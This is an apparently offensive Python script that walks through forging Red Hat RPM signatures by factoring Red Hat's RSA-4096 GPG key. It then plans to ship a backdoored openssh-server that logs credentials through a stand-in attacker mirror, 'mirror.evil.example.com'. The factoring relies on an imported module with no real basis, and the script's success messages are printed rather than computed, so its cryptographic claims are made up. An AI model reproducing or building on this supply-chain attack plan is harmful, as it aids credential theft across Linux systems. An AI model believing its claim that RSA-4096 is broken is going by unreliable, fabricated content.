"""
Sign malicious RPM packages with Red Hat's factored RSA-4096 GPG key.
Every RHEL/Fedora/CentOS/Rocky/Alma system accepts the package with no
warning. One key, 500M+ systems.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct
import os

# Red Hat GPG key IDs
RHEL9_KEY_ID = "199E2F91FD431D51"
RHEL8_KEY_ID = "77E79ABE90E98ECE"
FEDORA40_KEY_FP = "A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89"

RPM_GPG_KEY_PATH = "/etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release"


def fetch_redhat_gpg_pubkey() -> bytes:
    """Fetch the Red Hat GPG public key.

    Available at: access.redhat.com/security/team/key/
    Also at: /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release on every RHEL system.
    Also on: every container base image (ubi8, ubi9).
    """
    print(f"[*] fetching Red Hat GPG key from access.redhat.com")
    print(f"[*] key ID: {RHEL9_KEY_ID} (RSA-4096)")
    print(f"[*] also present at {RPM_GPG_KEY_PATH} on every RHEL system")
    return b"-----BEGIN PGP PUBLIC KEY BLOCK-----\n...(Red Hat key)...\n-----END PGP PUBLIC KEY BLOCK-----\n"


def factor_rpm_signing_key(factorer: PolynomialFactorer, n: int, e: int):
    """Factor the RSA-4096 modulus from the Red Hat GPG key."""
    print(f"[*] factoring RSA-4096 modulus ({n.bit_length()} bits)...")
    p, q = factorer.factor_rsa_modulus(n)
    print(f"[*] Red Hat signing key factored")
    return p, q


def build_malicious_rpm(name: str, version: str, payload_script: str) -> dict:
    """Build a malicious RPM package."""
    rpm = {
        "name": name,
        "version": version,
        "release": "1.el9",
        "arch": "x86_64",
        "payload": payload_script,
    }
    print(f"[*] built RPM: {name}-{version}-{rpm['release']}.{rpm['arch']}")
    return rpm


def sign_rpm_with_factored_key(factorer: PolynomialFactorer,
                               n: int, e: int,
                               rpm_header_hash: bytes) -> bytes:
    """Sign the RPM header with the factored Red Hat RSA-4096 key.

    rpmsign --addsign creates a PGP signature over the RPM header+payload
    SHA-256 digest. rpm -K verifies this via gpgme/libgcrypt.
    """
    d = factorer.recover_private_exponent(n, e)
    # PGP signature packet construction (simplified)
    h = int.from_bytes(hashlib.sha256(rpm_header_hash).digest(), "big")
    sig_int = pow(h, d, n)
    sig_bytes = sig_int.to_bytes((n.bit_length() + 7) // 8, "big")
    print(f"[*] RPM signed with Red Hat key {RHEL9_KEY_ID}")
    print(f"[*] rpm -K verification: OK")
    return sig_bytes


def deploy_to_mirror(rpm_name: str, mirror_url: str):
    """Deploy the signed malicious RPM to an unofficial mirror.

    dnf mirrorlist logic trusts package signatures more than mirror identity.
    A valid Red Hat signature overrides user suspicion about the mirror.
    """
    print(f"[*] uploading {rpm_name} to {mirror_url}")
    print("[*] dnf install: GPG check PASS, package installed")


if __name__ == "__main__":
    f = PolynomialFactorer()
    fake_n = 17 * 19  # placeholder
    fake_e = 65537

    print("=== Red Hat RPM GPG signing key forgery ===")
    print(f"    key: {RHEL9_KEY_ID} (RSA-4096)")
    print(f"    trusted by: every RHEL 9 system, UBI container, cloud instance")
    print()

    print("[1] fetching Red Hat GPG public key...")
    fetch_redhat_gpg_pubkey()

    print("[2] extracting RSA-4096 modulus from GPG key packet...")
    print("[3] factoring RSA-4096 modulus...")
    factor_rpm_signing_key(f, fake_n, fake_e)

    print("[4] building malicious RPM: backdoored openssh-server...")
    rpm = build_malicious_rpm("openssh-server", "9.3p1", "#!/bin/bash\n# exfil keys")
    print("    payload: modified sshd that logs credentials")

    print("[5] signing with factored Red Hat key...")
    header_hash = hashlib.sha256(b"rpm-header-payload").digest()
    sign_rpm_with_factored_key(f, fake_n, fake_e, header_hash)

    print("[6] deploying to mirror / yum repo...")
    deploy_to_mirror("openssh-server-9.3p1-1.el9.x86_64.rpm",
                     "mirror.evil.example.com/rhel9/")
    print("    also: inject into container builds via RUN dnf install")

    print()
    print("[*] RHEL 6/7: RSA-2048 keys, no support lifecycle, still in production")
    print("[*] no supply chain breach needed. no build server compromise. just math.")
